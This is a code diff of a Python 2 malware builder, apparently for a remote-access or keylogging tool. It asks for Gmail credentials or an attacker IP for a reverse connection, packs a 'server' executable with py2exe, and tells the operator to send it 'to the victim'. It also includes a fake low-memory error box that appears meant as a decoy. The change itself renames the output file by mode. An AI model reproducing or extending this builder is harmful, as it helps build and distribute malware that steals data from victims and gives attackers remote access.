@@ -16,8 +16,8 @@ error = "0"
 email = ""
 pwd = ""
 mailto = ""
-serverlineStart = 131
-serverlineStop = 234
+serverlineStart = 134
+serverlineStop = 237
 
 while loop == True:
     os.system("cls")
@@ -26,6 +26,7 @@ while loop == True:
     print "(2) - via the client.exe (to your computer directly)\n"
     option = raw_input('\nChoose a number [1-2]: ')
     if option == "1":
+        appname="server_email"
         email = raw_input("Input your Gmail address: ")
         pwd = raw_input("Input your Gmail password: ")
         mailto = raw_input(
@@ -34,6 +35,7 @@ while loop == True:
             mailto = email
         loop = False
     elif option == "2":
+        appname="server_ip"
         attacker_ip = raw_input('IP for revrse connection: ')
         loop = False
 
@@ -66,8 +68,8 @@ def done():
     os.system('cls')
     if option != "1":
         print 'Client has been created under name client.exe'
-    print 'Server has been created under the name server.exe\n'
-    print '\nRemember: You send the server.exe to the victim!'
+    print 'Server has been created under the name '+appname+'.exe\n'
+    print '\nRemember: You send the '+appname+'.exe ' + 'to the victim!'
     raw_input("Press Enter to continue...")
     exit()
 
@@ -91,13 +93,14 @@ def py2crypt(filename):
             options={'py2exe': {'bundle_files': 1, "excludes": ['pyreadline', 'difflib', 'doctest', 'optparse', 'pickle'], "dll_excludes": [
                 'msvcr71.dll', 'Crypt32.dll'], "compressed": True, "optimize": 2}},
             windows=[{'script': filename,
-                      "icon_resources": [(0, "icon.ico")]}],
+                      "icon_resources": [(0, "icon.ico")],
+                      "dest_base" : appname}],
             zipfile=None,
             #  'uac_info': "requireAdministrator"
         )
-        if os.path.exists('server.exe'):
-            os.remove('server.exe')
-        os.rename('dist/server.exe', 'server.exe')
+        if os.path.exists(appname+'.exe'):
+            os.remove(appname+'.exe')
+        os.rename('dist/'+appname+'.exe', appname+'.exe')
         rmtree('build/')
         rmtree('dist/')
 
@@ -231,7 +234,7 @@ if error == "1":
     MB_ICONSTOP = 0x10
     ctypes.windll.user32.MessageBoxW(
         None, u'Virtual memory is too low to run this program', u'Error', MB_OK | MB_ICONSTOP)
-		
+        
 import sys
 import os
 import BaseHTTPServer
